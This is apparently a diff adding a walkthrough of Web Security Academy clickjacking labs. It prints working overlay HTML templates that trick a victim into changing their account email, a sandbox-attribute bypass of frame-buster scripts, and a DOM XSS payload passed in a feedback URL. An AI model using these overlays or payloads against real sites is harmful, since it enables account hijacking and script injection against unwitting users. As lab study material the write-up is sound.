@@ -102,3 +102,151 @@ If the div isn't lined up properly, tweak the `top` and `left` values in the CSS
 Once everything is properly aligned, change the text from "Test me" to "Click me", then click "Store" again. 
 
 Finally, hit "Deliver exploit to victim" to solve the lab.
+
+## Clickbandit
+
+While you can manually build a clickjacking proof of concept using the method described earlier, it can be quite tedious and time-consuming. When testing for clickjacking vulnerabilities in real-world applications, it's better to use Burp's __Clickbandit__ tool. This tool allows you to perform the needed actions directly in your browser on a page that can be framed, and then automatically generates an HTML file with the correct clickjacking overlay. With Clickbandit, you can create an interactive proof of concept in just a few seconds --- no need to write any HTML or CSS yourself. 
+
+## Clickjacking with prefilled form input
+
+Some websites that involve filling out and submitting forms allow form fields to be pre-filled using GET parameters before submission. Other sites might require certain text inputs before a form can be submitted. Since GET parameters are part of the URL, an attacker can modify the target URL to include values they choose. Then, just like in a basic clickjacking attack, the transparent "submit" button from the target site can be overlaid onto the decoy website. 
+
+### Lab: Clickjacking with form input data prefilled from a URL parameter
+
+Log in to your account with `wiener:peter`
+
+Go to the exploit server and paste the following HTML code into the "Body" section:
+
+```html
+<style>
+    iframe {
+        position: relative;
+        width: $width_value;
+        height: $height_value;
+        opacity: $opacity;
+        z-index: 2;
+    }
+    div {
+        position: absolute;
+        top: $top_value;
+        left: $side_value;
+        z-index: 1;
+    }
+</style>
+<div>Test me</div>
+<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
+```
+
+Replace `YOUR-LAB-ID` with your own lab ID (`https://` preceding) so that the iframe points to the user account page containing the "Update email" form. 
+
+Set appropriate pixel values for `$width_value` and `$height_value`. (`800px` and `600px` worked for me)
+
+Set `$opacity` to make the iframe transparent. Start with `0.1` for easier alignment, then lower it to `0.0001` before delivering to victim. 
+
+Click "Store" and then "View exploit". Hover your mouse over "Test me" to ceck that the cursor turns into a hand icon, confirming the div is properly positioned. If not, tweak the top and left values as needed. 
+
+Once aligned, change "Test me" to "Click me" and save it again by clicking "Store". Modify the email address in the iframe URL if needed, so it's different from your own. 
+
+Click "Deliver exploit to victim" to solve the lab. 
+
+## Frame busting scripts
+
+Clickjacking attacks become possible whenever a website allows itself to be loaded inside a frame. To prevent this, defenses typically focus on restricting framing. One common client-side method relies on using frame busting or frame breaking scripts within the browser. These protections can also come from browser extensions like NoScript. Such scripts are often designed to:
+
+- Verify that the application is running in the top-level window.
+- Force all frames to be visible.
+- Block clicks on invisible frames.
+- Detect and warn users about possible clickjacking attempts.
+
+### Frame busting scripts - Continued
+
+Frame busting techniques are often specific to certain browsers and platforms, and due to the flexible nature of HTML, attackers can usually find ways around them. Since frame busters rely on JavaScript, they may fail if the user's browser has JavaScript disabled or doesn't support it at all. A common method attackers use to bypass frame busters is by applying the HTML5 `iframe` `sandbox` attribute. If the sandbox allows `forms` or `scripts` but does not allow `top-navigation`, then frame busting scripts can't detect whether they're in the top window, effectively disabling them:
+
+```html
+<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>
+```
+
+Both `allow-forms` and `allow-scripts` let certain features work inside the iframe, but by blocking top-level navigation, the frame busting protections are neutralized while the target site remains functional. 
+
+### Lab: Clickjacking with a frame buster script
+
+Log in as `wiener:peter`
+
+Head over to the exploit server and paste the following HTML template into the "Body" section: 
+
+```html
+<style>
+    iframe {
+        position: relative;
+        width: $width_value;
+        height: $height_value;
+        opacity: $opacity;
+        z-index: 2;
+    }
+    div {
+        position: absolute;
+        top: $top_value;
+        left: $side_value;
+        z-index: 1;
+    }
+</style>
+<div>Test me</div>
+<iframe sandbox="allow-forms"
+src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
+```
+
+Replace `YOUR-LAB-ID` in the frame `src` with your specific lab ID, so the link points to the target site's user account page containing the "Update email" form. 
+
+Set suitable pixel values for `$width_value` and `$height_value` (`800px` and `600px` worked for me)
+
+Adjust `$top_value` and `$side_value` to align the "Update email" button with the "Test me" text (`450px` and `80px` worked for me)
+
+Take note: adding `sandbox="allow forms"` disables the frame buster, allowing your clickjacking setup to work. 
+
+Click "Store" and then "View exploit". Hover over "Test me" and make sure the cursor turns into a hand, confirming the div is aligned. If not, tweak the `top` and `left` CSS values until it fits properly. 
+
+Once it's properly positioned, change "Test me" to "Click me" and hit "Store". Update the email address in the URL if needed, so it's different from your own. 
+
+Click "Deliver exploit to victim" to solve the lab. 
+
+## Combining clickjacking with a DOM XSS attack
+
+Up to this point, we've discussed clickjacking as a standalone attack. In the past, it has been used for simple actions like artificially increasing "likes" on Facebook pages. However, clickjacking becomes far more powerful when it's used as a delivery method for another attack, such as a DOM-based XSS. Setting up this combined attack is fairly easy once the attacker has discovered a suitable XSS vulnerability. The attacker simply merges the XSS payload into the iframe's target URL, so that when the user clicks the hidden button or link, it triggers the DOM XSS attack. 
+
+### Lab: Exploiting clickjacking vulnerability to trigger DOM-based XSS
+
+Open the exploit server and paste the following HTML template into the "Body" field:
+
+```html
+<style>
+    iframe {
+        position:relative;
+        width:$width_value;
+        height:$height_value;
+        opacity:$opacity;
+        z-index:2;
+    }
+    div {
+        position:absolute;
+        top:$top_value;
+        left:$side_value;
+        z-index:1;
+    }
+</style>
+<div>Test me</div>
+<iframe src="YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
+```
+
+Replace `YOUR-LAB-ID` in the iframe’s `src` attribute with your personal lab ID so the URL points to the "Submit feedback" page of the target site.
+
+Set appropriate pixel values for `$height_value` and `$width_value` (`800px` and `600px` worked for me).
+
+Adjust the `$top_value` and `$side_value` properties so that the "Submit feedback" button and the "Test me" decoy element line up correctly (`515px` and `75px` worked for me).
+
+Set the $opacity so the iframe is transparent — start with 0.1 for easier alignment, then switch to 0.0001 for the final exploit.
+
+Click "Store" and then "View exploit". Hover over "Test me" and confirm the cursor changes to a hand, indicating correct positioning. If not, tweak the top and left style settings until it lines up perfectly.
+
+Click "Test me" — the print dialog should appear. Change the text from "Test me" to "Click me" and save by clicking "Store". Finally, click "Deliver exploit to victim" to complete and solve the lab.
+
+
